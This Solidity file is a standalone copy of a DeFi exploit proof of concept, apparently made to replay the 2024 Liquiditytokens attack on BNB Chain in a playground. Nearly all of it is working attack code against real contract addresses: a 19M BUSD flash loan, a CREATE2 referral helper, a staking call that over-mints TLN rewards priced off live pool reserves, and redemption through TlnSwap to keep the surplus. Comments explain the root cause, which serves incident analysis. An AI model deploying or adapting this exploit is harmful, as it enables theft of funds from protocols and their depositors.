// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-Liquiditytokens).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (ContractTest is Test; testExploit() flash-loans from the PancakeV3
// pool and the flash callback `pancakeV3FlashCallback` lives on the test
// itself), so there is no standalone exploit contract to deploy. This is a
// self-contained standalone copy of that inline attack (testExploit -> run(),
// pancakeV3FlashCallback unchanged, including the CREATE2 `Money` helper
// deploy) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/Liquiditytokens_exp.sol.
//
// Root cause (see Liquiditytokens_exp.md): the staking pool at
// 0x85F82230883693f1Bbff65be1f7663EE5F0AA5f8 (unverified) mints a TLN reward
// priced off the LIVE reserves of the VOW/USDT and VOW/VUSD pairs rather than
// off the LP token's own backing, so staking a tiny (942.25) LP position mints
// ~3.2M TLN -- ~3,396x the LP token count. TlnSwap.lock() then redeems ANY TLN
// for vUSD at a fixed 1000/984 rate with no check on how the TLN was minted,
// turning the over-issued TLN into real vUSD, which is swapped back through
// PancakeSwap to USDT to repay the flash loan and pocket the surplus.
//
// Why the CREATE2 helper (`Money`): the staking pool credits referral rewards
// up a referral chain read from SmartNode.nodeRefererOf(staker), and SmartNode
// requires a fresh (not-yet-joined) address to `join(referer)` before it can
// stake. A throwaway helper contract (`Money`, mirroring the original test's
// nested `Money` contract) is deployed via `create2` with a fixed salt so its
// address is deterministic; its constructor immediately joins SmartNode under
// a referer, then a small "seed" stake through it establishes the referral
// link the main over-minting stake (called directly from this contract) later
// credits rewards through.

interface IWBNB {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniRouterV2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMoney {
    function stakes() external;
    function Send() external;
}

contract LiquiditytokensDrain {
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniPairV3 internal constant Pool = IUniPairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniPairV2 internal constant Pair = IUniPairV2(0x72dCf845AE36401e82e681B0E063d0703bAC0Bba);
    IUniRouterV2 internal constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 internal constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant Vow = IERC20(0xF585B5b4f22816BAf7629AEA55B701662630397b);
    IERC20 internal constant Vusd = IERC20(0xc0D8DaA6516BaB4eFCe440860987E735BaB44160);
    IERC20 internal constant TLN = IERC20(0xf7d142a354322C7560250CaA0e2a06c89649e4C2);
    address internal constant Tlnswap = 0x19B3F588BdC9a6f9ecb8255919B02F9ADF053363;
    address internal constant VulnContract = 0x028c911C10c9E346158206991E02D09Bd0A8A35b; // SmartNode
    address internal constant VulnContract_2 = 0x85F82230883693f1Bbff65be1f7663EE5F0AA5f8; // staking pool

    // entrypoint: recorded by the playground.
    function run() external {
        BUSD.approve(address(Pool), 0); // no-op, keeps slot warm like the original trace ordering
        Pool.flash(address(this), 19_000_000 ether, 0, "0x123");
    }

    // PancakeSwap V3-style flash callback.
    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes calldata /*data*/ ) external {
        // Step 1: build a small VOW/VUSD LP position and register a referral
        // via a fresh CREATE2-deployed `Money` helper.
        swap_token_to_tokens(address(WBNB), address(BUSD), address(Vow), 2 ether);
        swap_token_to_token(address(Vow), address(Vusd), 854_320_785_746_786_696_066);
        Vusd.approve(address(Router), 2_000_000 ether);
        Vow.approve(address(Router), 2_000_000 ether);
        Router.addLiquidity(
            address(Vow),
            address(Vusd),
            854_320_785_746_786_696_066,
            1_182_464_186_867_710_570_390,
            0,
            0,
            address(this),
            block.timestamp + 500
        );

        address helper = address(new Money{ salt: bytes32(uint256(0)) }());
        // join SmartNode under the freshly-deployed helper's referral slot.
        (bool okJoin,) = VulnContract.call(abi.encodeWithSelector(bytes4(0x28ffe6c8), helper));
        okJoin;

        // Step 2: the main over-minting stake. Flash-drain more BUSD->VOW so
        // the pool's referrer lookup for THIS contract resolves, then stake a
        // tiny LP amount that the pool reward-prices off live pair reserves.
        swap_token_to_token(address(BUSD), address(Vow), 19_000_000 ether);

        Pair.transfer(helper, 1 ether);
        IMoney(helper).stakes(); // seed stake through the helper, establishing the referral chain

        Pair.approve(VulnContract_2, type(uint256).max);
        // stake(uint256) on the vulnerable pool -- mints TLN priced off live
        // VOW/USDT + VOW/VUSD reserves rather than the LP's own backing.
        (bool okStake,) = VulnContract_2.call(abi.encodeWithSelector(bytes4(0xa694fc3a), 942_253_377_026_177_767_815));
        okStake;

        IMoney(helper).Send(); // forward the helper's over-minted TLN back here

        Vow.approve(Tlnswap, type(uint256).max);
        TLN.approve(Tlnswap, type(uint256).max);

        // Step 3: redeem the over-minted TLN for vUSD at TlnSwap's fixed
        // 1000/984 rate (lock(uint256)) -- no check on how the TLN was minted.
        (bool okLock,) = Tlnswap.call(abi.encodeWithSelector(bytes4(0xdd467064), 3_199_510_344_301_177_871_795_565));
        okLock;

        // Step 4: swap the redeemed vUSD back to VOW to USDT and repay the
        // flash loan (principal + fee0), keeping the surplus.
        swap_token_to_token(address(Vusd), address(Vow), 3_199_510 ether);
        swap_token_to_token(address(Vow), address(BUSD), 800_000 ether);

        BUSD.transfer(address(Pool), 19_000_000 * 1e18 + fee0);
    }

    function swap_token_to_tokens(address a, address b, address c, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](3);
        path[0] = a;
        path[1] = b;
        path[2] = c;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable { }
}

// Throwaway CREATE2-deployed referral helper, mirroring the original test's
// nested `Money` contract: joins SmartNode under a referer in its constructor,
// then exposes stakes()/Send() so the main exploit can route a seed stake and
// pull the resulting over-minted TLN back to itself.
contract Money {
    IUniPairV2 internal constant Pair = IUniPairV2(0x72dCf845AE36401e82e681B0E063d0703bAC0Bba);
    address internal constant VulnContract = 0x028c911C10c9E346158206991E02D09Bd0A8A35b; // SmartNode
    address internal constant VulnContract_2 = 0x85F82230883693f1Bbff65be1f7663EE5F0AA5f8; // staking pool
    IERC20 internal constant TLN = IERC20(0xf7d142a354322C7560250CaA0e2a06c89649e4C2);
    address internal constant Referer = 0xEB1Df3Bed5bd20c010CAAd4EE18Ff7A697334E68;
    address internal owner;

    constructor() {
        owner = msg.sender;
        VulnContract.call(abi.encodeWithSelector(bytes4(0x60410fbb), 1));
        VulnContract.call(abi.encodeWithSelector(bytes4(0x28ffe6c8), Referer));
    }

    function stakes() external {
        require(owner == msg.sender, "error");
        Pair.approve(VulnContract_2, type(uint256).max);
        VulnContract_2.call(abi.encodeWithSelector(bytes4(0xa694fc3a), 1 ether));
    }

    function Send() external {
        require(owner == msg.sender, "error");
        TLN.transfer(msg.sender, TLN.balanceOf(address(this)));
    }

    fallback() external payable { }
    receive() external payable { }
}
